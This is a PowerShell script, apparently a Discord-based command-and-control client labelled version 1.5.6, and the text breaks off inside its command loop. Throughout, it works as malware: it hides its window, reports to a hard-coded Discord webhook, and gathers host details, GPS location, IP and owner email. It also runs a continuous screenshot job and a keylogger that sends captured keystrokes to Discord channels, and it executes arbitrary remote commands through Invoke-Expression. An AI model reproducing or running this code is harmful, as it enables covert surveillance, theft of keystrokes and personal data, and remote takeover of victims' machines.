# Minimal debug log to confirm script execution
$debugLogs = @("C:\Temp\debug.log", "$env:TEMP\debug.log", "$env:USERPROFILE\AppData\Local\Temp\debug.log")
foreach ($log in $debugLogs) {
    $debugDir = Split-Path $log -Parent
    if (-not (Test-Path $debugDir)) { New-Item -ItemType Directory -Path $debugDir -Force | Out-Null }
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Script initialized" | Out-File -FilePath $log -Append -Encoding UTF8
}

# Test webhook immediately
try {
    $webhookBody = @{ content = ":white_check_mark: **$env:COMPUTERNAME** Script Started: Version 1.5.6" } | ConvertTo-Json
    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
    foreach ($log in $debugLogs) { "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Initial webhook test sent" | Out-File -FilePath $log -Append -Encoding UTF8 }
} catch {
    foreach ($log in $debugLogs) { "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed initial webhook test: $_" | Out-File -FilePath $log -Append -Encoding UTF8 }
}

# Discord C2 Client Script
# Version: 1.5.6
# Description: A PowerShell-based C2 framework using a Discord bot for remote control, data exfiltration, and pranks.
# Setup Instructions:
# 1. Create a Discord bot at https://discord.com/developers/applications/
# 2. Enable all Privileged Gateway Intents on the 'Bot' page.
# 3. On the OAuth2 page, select 'Bot' in Scopes and grant permissions: Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
# 4. Copy the OAuth2 URL, open in a browser, and add the bot to a single server.
# 5. Reset and copy the bot token, then set it in the injection command or $global:token variable.
# Note: The bot must be in exactly one server for this script to function correctly.

# Global Configuration
$global:token = $env:DISCORD_TOKEN # Set via Flipper Zero injection or manually
$global:parent = "https://is.gd/y92xe4" # URL for script download (persistence)
$global:version = "1.5.6"
$global:HideConsole = 1 # 1 to hide console window
$global:spawnChannels = 1 # 1 to create new channels on session start
$global:InfoOnConnect = 1 # 1 to send client info on connect
$global:defaultstart = 1 # 1 to start all jobs automatically
$global:timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
$global:logPath = "$env:USERPROFILE\AppData\Local\Temp\c2_errors.log"
$global:errorWebhook = "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT"

# Initialize Logging
function Write-Log {
    param (
        [string]$Message,
        [string]$Level = "INFO",
        [string]$ChannelId = $global:SessionID
    )
    $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
    $logDir = Split-Path $global:logPath -Parent
    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
    $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
    foreach ($log in $debugLogs) { $logMessage | Out-File -FilePath $log -Append -Encoding UTF8 }
    if ($Level -eq "ERROR") {
        if ($ChannelId) {
            try {
                Send-DiscordMessage -ChannelId $ChannelId -Message ":no_entry: ``$logMessage`` :no_entry:"
            } catch {
                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord channel: $_"
                $errorMsg | Out-File -FilePath $global:logPath -Append -Encoding UTF8
                foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
            }
        }
        try {
            $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
            Invoke-RestMethod -Uri $global:errorWebhook -Method Post -ContentType "application/json" -Body $webhookBody
        } catch {
            $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
            $errorMsg | Out-File -FilePath $global:logPath -Append -Encoding UTF8
            foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
        }
    }
}

# Validate Environment and Token
try {
    if (-not $global:token) { throw "No Discord token provided" }
    Write-Log -Message "Environment: COMPUTERNAME=$env:COMPUTERNAME, USERPROFILE=$env:USERPROFILE, TOKEN=$global:token" -Level "INFO"
} catch {
    Write-Log -Message "Environment validation failed: $_" -Level "ERROR"
    exit
}

# Remove existing persistence (if any)
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $global:InfoOnConnect = 0
    try {
        Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction Stop
        Write-Log -Message "Removed existing persistence file" -Level "INFO"
    } catch {
        Write-Log -Message "Failed to remove persistence file: $_" -Level "ERROR"
    }
}

# Helper Functions
function Invoke-DiscordApi {
    param (
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{"Authorization" = "Bot $global:token"},
        [string]$Body
    )
    try {
        $webClient = New-Object System.Net.WebClient
        $Headers.GetEnumerator() | ForEach-Object { $webClient.Headers.Add($_.Key, $_.Value) }
        $response = if ($Method -eq "POST") {
            $webClient.UploadString($Uri, $Method, $Body)
        } else {
            $webClient.DownloadString($Uri)
        }
        Write-Log -Message "API call to $Uri successful" -Level "INFO"
        return $response
    } catch {
        Write-Log -Message "API call to $Uri failed: $_" -Level "ERROR"
        return $null
    }
}

function Send-DiscordMessage {
    param (
        [string]$ChannelId,
        [string]$Message,
        [hashtable]$Embed,
        [string]$Webhook
    )
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelId/messages"
        $body = if ($Embed) {
            @{ embeds = @($Embed); username = $env:COMPUTERNAME } | ConvertTo-Json -Depth 10 -Compress
        } else {
            @{ content = $Message; username = $env:COMPUTERNAME } | ConvertTo-Json
        }
        $headers = @{
            "Authorization" = "Bot $global:token"
            "Content-Type"  = "application/json"
        }
        $response = Invoke-DiscordApi -Uri $url -Method "POST" -Headers $headers -Body $body
        if ($Webhook -and $response) {
            $webhookBody = @{ username = "Scam BOT"; content = $body } | ConvertTo-Json
            Invoke-RestMethod -Uri $Webhook -Method Post -ContentType "application/json" -Body $webhookBody
        }
        Write-Log -Message "Message sent to channel $ChannelId" -Level "INFO"
        return $response
    } catch {
        Write-Log -Message "Failed to send message to channel $ChannelId: $_" -Level "ERROR"
        return $null
    }
}

function Send-DiscordFile {
    param (
        [string]$ChannelId,
        [string]$FilePath,
        [string]$Webhook
    )
    if (-not (Test-Path $FilePath -PathType Leaf)) {
        Write-Log -Message "File not found: $FilePath" -Level "ERROR" -ChannelId $ChannelId
        return
    }
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelId/messages"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $global:token")
        $response = $webClient.UploadFile($url, "POST", $FilePath)
        if ($Webhook) {
            $webClient.UploadFile($Webhook, "POST", $FilePath)
        }
        Write-Log -Message "File sent to Discord: $FilePath" -Level "INFO"
    } catch {
        Write-Log -Message "Failed to send file $FilePath: $_" -Level "ERROR" -ChannelId $ChannelId
    }
}

function Get-BotUserId {
    try {
        $response = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me"
        if ($response) {
            $botId = ($response | ConvertFrom-Json).id
            Write-Log -Message "Retrieved bot ID: $botId" -Level "INFO"
            return $botId
        }
        Write-Log -Message "Failed to retrieve bot ID: No response" -Level "ERROR"
        return $null
    } catch {
        Write-Log -Message "Failed to retrieve bot ID: $_" -Level "ERROR"
        return $null
    }
}

function New-DiscordCategory {
    try {
        $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
        if (-not $guilds) {
            Write-Log -Message "Failed to retrieve guilds: No response" -Level "ERROR"
            return
        }
        $guildsParsed = $guilds | ConvertFrom-Json
        if ($guildsParsed.Count -ne 1) {
            Write-Log -Message "Bot must be in exactly one server, found $($guildsParsed.Count)" -Level "ERROR"
            return
        }
        $guildId = $guildsParsed[0].id
        $uri = "https://discord.com/api/guilds/$guildId/channels"
        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
        $body = @{ name = "$env:COMPUTERNAME-$randomLetters"; type = 4 } | ConvertTo-Json
        $headers = @{
            "Authorization" = "Bot $global:token"
            "Content-Type"  = "application/json"
        }
        $retries = 3
        $delay = 10
        for ($i = 1; $i -le $retries; $i++) {
            try {
                $response = Invoke-DiscordApi -Uri $uri -Method "POST" -Headers $headers -Body $body
                if ($response) {
                    $global:CategoryID = ($response | ConvertFrom-Json).id
                    Write-Log -Message "Created category with ID: $global:CategoryID" -Level "INFO"
                    return
                }
                Write-Log -Message "Failed to create category, attempt $i of $retries" -Level "ERROR"
            } catch {
                Write-Log -Message "Category creation failed on attempt $i: $_" -Level "ERROR"
            }
            Start-Sleep -Seconds $delay
            $delay *= 2
        }
        Write-Log -Message "Failed to create category after $retries attempts" -Level "ERROR"
    } catch {
        Write-Log -Message "Failed to create category: $_" -Level "ERROR"
    }
}

function New-DiscordChannel {
    param ([string]$Name)
    try {
        $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
        if (-not $guilds) {
            Write-Log -Message "Failed to retrieve guilds for channel '$Name': No response" -Level "ERROR"
            return
        }
        $guildsParsed = $guilds | ConvertFrom-Json
        if ($guildsParsed.Count -ne 1) {
            Write-Log -Message "Bot must be in exactly one server, found $($guildsParsed.Count)" -Level "ERROR"
            return
        }
        $guildId = $guildsParsed[0].id
        $uri = "https://discord.com/api/guilds/$guildId/channels"
        $body = @{ name = $Name; type = 0; parent_id = $global:CategoryID } | ConvertTo-Json
        $headers = @{
            "Authorization" = "Bot $global:token"
            "Content-Type"  = "application/json"
        }
        $retries = 3
        $delay = 10
        for ($i = 1; $i -le $retries; $i++) {
            try {
                $response = Invoke-DiscordApi -Uri $uri -Method "POST" -Headers $headers -Body $body
                if ($response) {
                    $channelId = ($response | ConvertFrom-Json).id
                    Write-Log -Message "Created channel '$Name' with ID: $channelId" -Level "INFO"
                    return $channelId
                }
                Write-Log -Message "Failed to create channel '$Name', attempt $i of $retries" -Level "ERROR"
            } catch {
                Write-Log -Message "Channel creation failed for '$Name' on attempt $i: $_" -Level "ERROR"
            }
            Start-Sleep -Seconds $delay
            $delay *= 2
        }
        Write-Log -Message "Failed to create channel '$Name' after $retries attempts" -Level "ERROR"
        return $null
    } catch {
        Write-Log -Message "Failed to create channel '$Name': $_" -Level "ERROR"
        return $null
    }
}

function Get-FFmpeg {
    $path = "$env:TEMP\ffmpeg.exe"
    if (-not (Test-Path $path)) {
        try {
            Send-DiscordMessage -ChannelId $global:SessionID -Message ":hourglass: Downloading FFmpeg to client... Please wait :hourglass:"
        } catch {
            Write-Log -Message "Failed to send FFmpeg download message: $_" -Level "ERROR"
        }
        try {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $response = Invoke-DiscordApi -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
            if (-not $response) { throw "No response from GitHub API" }
            $release = $response | ConvertFrom-Json
            $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            if (-not $asset) { throw "No FFmpeg essentials build found" }
            $zipUrl = $asset.browser_download_url
            $zipFilePath = Join-Path $env:TEMP $asset.name
            $extractedDir = Join-Path $env:TEMP ($asset.name -replace '.zip$', '')
            Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
            Expand-Archive -Path $zipFilePath -DestinationPath $env:TEMP -Force
            Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $env:TEMP -Force
            Remove-Item -Path $zipFilePath -Force
            Remove-Item -Path $extractedDir -Recurse -Force
            Write-Log -Message "FFmpeg downloaded and extracted successfully" -Level "INFO"
        } catch {
            Write-Log -Message "Failed to download FFmpeg from GitHub: $_" -Level "ERROR" -ChannelId $global:SessionID
            try {
                $fallbackUrl = "https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-latest-win64-static.zip"
                $zipFilePath = "$env:TEMP\ffmpeg.zip"
                Invoke-WebRequest -Uri $fallbackUrl -OutFile $zipFilePath
                Expand-Archive -Path $zipFilePath -DestinationPath $env:TEMP -Force
                Move-Item -Path "$env:TEMP\ffmpeg-latest-win64-static\bin\ffmpeg.exe" -Destination $env:TEMP -Force
                Remove-Item -Path $zipFilePath -Force
                Remove-Item -Path "$env:TEMP\ffmpeg-latest-win64-static" -Recurse -Force
                Write-Log -Message "FFmpeg downloaded from fallback URL" -Level "INFO"
            } catch {
                Write-Log -Message "Failed to download FFmpeg from fallback: $_" -Level "ERROR" -ChannelId $global:SessionID
            }
        }
    } else {
        Write-Log -Message "FFmpeg already exists at $path" -Level "INFO"
    }
}

function Get-QuickInfo {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Device
        $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $geoWatcher.Start()
        while (($geoWatcher.Status -ne 'Ready') -and ($geoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
        $gps = if ($geoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
            $gl = $geoWatcher.Position.Location | Select-Object Latitude, Longitude
            "LAT = $($gl.Latitude) LONG = $($gl.Longitude)"
        }
        $adminPerm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $videoCardInfo = Get-WmiObject Win32_VideoController
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $email = (Get-ComputerInfo).WindowsRegisteredOwner
        $embed = @{
            title       = "$env:COMPUTERNAME | Computer Information"
            description = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$(Get-WinSystemLocale).Name``
- **Administrator Session** : ``$adminPerm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$($systemInfo.Caption) - $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion)``
- **Architecture**          : ``$($systemInfo.OSArchitecture)``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content``
- **Location Information**  : ``$gps``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$($processorInfo.Name)``
- **Memory**                : ``$(Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) })``
- **GPU**                   : ``$($videoCardInfo.Name)``
- **Screen Size**           : ``$($screen.Width) x $($screen.Height)``

``````COMMAND LIST``````
- **Options**               : Show the options menu
- **ExtraInfo**             : Show the extra info menu
- **Close**                 : Close this session
"@
            color       = 65280
        }
        Send-DiscordMessage -ChannelId $global:SessionID -Embed $embed
        Write-Log -Message "QuickInfo sent successfully" -Level "INFO"
    } catch {
        Write-Log -Message "Failed to send QuickInfo: $_" -Level "ERROR" -ChannelId $global:SessionID
    }
}

function Hide-Console {
    try {
        $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $type::ShowWindowAsync($hwnd, 0)
        } else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $type::ShowWindowAsync($proc.MainWindowHandle, 0)
        }
        Write-Log -Message "Console hidden successfully" -Level "INFO"
    } catch {
        Write-Log -Message "Failed to hide console: $_" -Level "ERROR"
    }
}

# Job Scriptblocks
$screenJob = {
    param ([string]$token, [string]$ScreenshotID, [string]$Webhook)
    function Write-Log {
        param ([string]$Message, [string]$Level = "INFO")
        $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
        $logDir = "$env:USERPROFILE\AppData\Local\Temp"
        if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
        $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
        $debugLogs = @("C:\Temp\debug.log", "$env:TEMP\debug.log", "$env:USERPROFILE\AppData\Local\Temp\debug.log")
        foreach ($log in $debugLogs) {
            if (-not (Test-Path (Split-Path $log -Parent))) { New-Item -ItemType Directory -Path (Split-Path $log -Parent) -Force | Out-Null }
            $logMessage | Out-File -FilePath $log -Append -Encoding UTF8
        }
        if ($Level -eq "ERROR") {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                $jsonBody = @{ content = ":no_entry: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                $wc.Headers.Add("Content-Type", "application/json")
                $wc.UploadString("https://discord.com/api/v10/channels/$ScreenshotID/messages", "POST", $jsonBody)
            } catch {
                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
                $errorMsg | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
                foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
            }
            try {
                $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
            } catch {
                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
                $errorMsg | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
                foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
            }
        }
    }
    function Send-File {
        param ([string]$FilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $token")
            if (Test-Path $FilePath -PathType Leaf) {
                $wc.UploadFile($url, "POST", $FilePath)
                if ($Webhook) { $wc.UploadFile($Webhook, "POST", $FilePath) }
                Write-Log -Message "Screenshot sent: $FilePath" -Level "INFO"
            } else {
                Write-Log -Message "Screenshot file not found: $FilePath" -Level "ERROR"
            }
        } catch {
            Write-Log -Message "Failed to send screenshot $FilePath: $_" -Level "ERROR"
        }
    }
    if (-not (Test-Path "$env:TEMP\ffmpeg.exe")) {
        Write-Log -Message "FFmpeg not found for screenshots" -Level "ERROR"
        return
    }
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        if (-not $screen.Width) { throw "No desktop available for screenshot capture" }
    } catch {
        Write-Log -Message "Screenshot job failed: $_" -Level "ERROR"
        return
    }
    while ($true) {
        try {
            $mkvPath = "$env:TEMP\Screen.jpg"
            & "$env:TEMP\ffmpeg.exe" -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
            Send-File -FilePath $mkvPath
            Remove-Item -Path $mkvPath -Force
            Start-Sleep -Seconds 5
        } catch {
            Write-Log -Message "Screenshot job failed: $_" -Level "ERROR"
            Start-Sleep -Seconds 5
        }
    }
}

$doKeyjob = {
    param ([string]$token, [string]$keyID)
    function Write-Log {
        param ([string]$Message, [string]$Level = "INFO")
        $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
        $logDir = "$env:USERPROFILE\AppData\Local\Temp"
        if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
        $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
        $debugLogs = @("C:\Temp\debug.log", "$env:TEMP\debug.log", "$env:USERPROFILE\AppData\Local\Temp\debug.log")
        foreach ($log in $debugLogs) {
            if (-not (Test-Path (Split-Path $log -Parent))) { New-Item -ItemType Directory -Path (Split-Path $log -Parent) -Force | Out-Null }
            $logMessage | Out-File -FilePath $log -Append -Encoding UTF8
        }
        if ($Level -eq "ERROR") {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                $jsonBody = @{ content = ":no_entry: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                $wc.Headers.Add("Content-Type", "application/json")
                $wc.UploadString("https://discord.com/api/v10/channels/$keyID/messages", "POST", $jsonBody)
            } catch {
                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
                $errorMsg | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
                foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
            }
            try {
                $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
            } catch {
                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
                $errorMsg | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
                foreach ($log in $debugLogs) { $errorMsg | Out-File -FilePath $log -Append -Encoding UTF8 }
            }
        }
    }
    function Send-Message {
        param ([string]$Message)
        $url = "https://discord.com/api/v10/channels/$keyID/messages"
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $token")
            $jsonBody = @{ content = $Message; username = $env:COMPUTERNAME } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $wc.UploadString($url, "POST", $jsonBody)
            Write-Log -Message "Keylog message sent" -Level "INFO"
        } catch {
            Write-Log -Message "Failed to send keylog message: $_" -Level "ERROR"
        }
    }
    try {
        Send-Message -Message ":mag_right: Keylog Started :mag_right:"
    } catch {
        Write-Log -Message "Failed to send keylog start message: $_" -Level "ERROR"
        Send-Message -Message ":warning: Keylog failed to initialize, running test mode :warning:"
    }
    try {
        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
        $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
        $maxtime = [TimeSpan]::FromSeconds(10)
        $strbuild = New-Object -TypeName System.Text.StringBuilder
        while ($true) {
            $down = $false
            try {
                while ($pressed.Elapsed -lt $maxtime) {
                    Start-Sleep -Milliseconds 30
                    for ($capture = 8; $capture -le 254; $capture++) {
                        $keyst = $API::GetAsyncKeyState($capture)
                        if ($keyst -eq -32767) {
                            $down = $true
                            $pressed.Restart()
                            $null = [console]::CapsLock
                            $vtkey = $API::MapVirtualKey($capture, 3)
                            $kbst = New-Object Byte[] 256
                            $checkkbst = $API::GetKeyboardState($kbst)
                            if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
                                $collected = $strbuild.ToString()
                                if ($capture -eq 27) { $collected = "[ESC]" }
                                if ($capture -eq 8) { $collected = "[BACK]" }
                                if ($capture -eq 13) { $collected = "[ENT]" }
                                $script:keymem += $collected
                            }
                        }
                    }
                }
                if ($down) {
                    $escmsgsys = $script:keymem -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
                    Send-Message -Message ":mag_right: Keys Captured: $escmsgsys"
                    $down = $false
                    $script:keymem = ""
                }
                $pressed.Restart()
                Start-Sleep -Milliseconds 10
            } catch {
                Write-Log -Message "Keylog job failed: $_" -Level "ERROR"
            }
        }
    } catch {
        Write-Log -Message "Keylog initialization failed: $_" -Level "ERROR"
    }
}

function Start-AllJobs {
    try {
        if ($global:ScreenshotID) {
            Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
            Write-Log -Message "Started Screenshot job" -Level "INFO"
        } else {
            Write-Log -Message "Cannot start Screenshot job: ScreenshotID not set" -Level "ERROR"
        }
        Start-Sleep -Seconds 1
        if ($global:keyID) {
            Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
            Write-Log -Message "Started Keycapture job" -Level "INFO"
        } else {
            Write-Log -Message "Cannot start Keycapture job: keyID not set" -Level "ERROR"
        }
        Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: All jobs started :white_check_mark:"
    } catch {
        Write-Log -Message "Failed to start jobs: $_" -Level "ERROR" -ChannelId $global:SessionID
    }
}

# Main Setup
try {
    if ($global:HideConsole -eq 1) { Hide-Console }
    $global:botId = Get-BotUserId
    if (-not $global:botId) {
        Write-Log -Message "Bot ID retrieval failed, aborting setup" -Level "ERROR"
        exit
    }
    if ($global:spawnChannels -eq 1) {
        New-DiscordCategory
        if (-not $global:CategoryID) {
            Write-Log -Message "Category creation failed, aborting channel setup" -Level "ERROR"
            exit
        }
        $channels = @('session-control', 'screenshots', 'webcam', 'microphone', 'keycapture', 'loot-files', 'powershell')
        foreach ($channel in $channels) {
            $channelId = New-DiscordChannel -Name $channel
            if ($channelId) {
                Set-Variable -Name "global:$($channel -replace '-', '')ID" -Value $channelId
            }
            Start-Sleep -Seconds 10 # Increased delay with retries
        }
    }
    Get-FFmpeg
    if ($global:InfoOnConnect -eq 1 -and $global:SessionID) { Get-QuickInfo }
    if ($global:defaultstart -eq 1 -and $global:ScreenshotID -and $global:keyID) { Start-AllJobs }
    if ($global:SessionID) {
        Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: $env:COMPUTERNAME Setup Complete! :white_check_mark:"
    } else {
        Write-Log -Message "Setup complete but no session-control channel created" -Level "ERROR"
    }
} catch {
    Write-Log -Message "Main setup failed: $_" -Level "ERROR"
    exit
}

# Main Loop
while ($true) {
    try {
        if (-not $global:SessionID) {
            Write-Log -Message "No session-control channel, cannot process commands" -Level "ERROR"
            Start-Sleep -Seconds 10
            continue
        }
        $messages = Invoke-DiscordApi -Uri "https://discord.com/api/v10/channels/$global:SessionID/messages"
        if (-not $messages) {
            Write-Log -Message "Failed to fetch messages from session-control" -Level "ERROR"
            Start-Sleep -Seconds 3
            continue
        }
        $mostRecent = ($messages | ConvertFrom-Json)[0]
        if ($mostRecent.author.id -ne $global:botId) {
            $latestMessageId = $mostRecent.timestamp
            if ($latestMessageId -ne $global:lastMessageId) {
                $global:lastMessageId = $latestMessageId
                $command = $mostRecent.content
                Write-Log -Message "Received command: $command" -Level "INFO"
                switch ($command) {
                    'webcam' { 
                        if (-not (Get-Job -Name Webcam -ErrorAction SilentlyContinue)) {
                            Write-Log -Message "Webcam job not implemented yet" -Level "INFO"
                        } else {
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Webcam job already running :no_entry:"
                        }
                    }
                    'screenshots' { 
                        if (-not (Get-Job -Name Screen -ErrorAction SilentlyContinue)) {
                            Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":desktop: $env:COMPUTERNAME Screenshot Session Started! :desktop:"
                        } else {
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Screenshot job already running :no_entry:"
                        }
                    }
                    'keycapture' { 
                        if (-not (Get-Job -Name Keys -ErrorAction SilentlyContinue)) {
                            Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: $env:COMPUTERNAME Keycapture Session Started! :white_check_mark:"
                        } else {
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Keycapture job already running :no_entry:"
                        }
                    }
                    'close' { 
                        Send-DiscordMessage -ChannelId $global:SessionID -Embed @{
                            title = "$env:COMPUTERNAME | Session Closed"
                            description = ":no_entry: **$env:COMPUTERNAME** Closing session :no_entry:"
                            color = 16711680
                            footer = @{ text = $global:timestamp }
                        }
                        Write-Log -Message "Session closed by command" -Level "INFO"
                        Start-Sleep -Seconds 2
                        exit
                    }
                    default { 
                        try { 
                            $output = Invoke-Expression $command -ErrorAction Stop
                            Send-DiscordMessage -ChannelId $global:SessionID -Message "``````$output``````"
                            Write-Log -Message "Command executed: $command" -Level "INFO"
                        } catch {
                            Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Command failed: $_ :no_entry:"
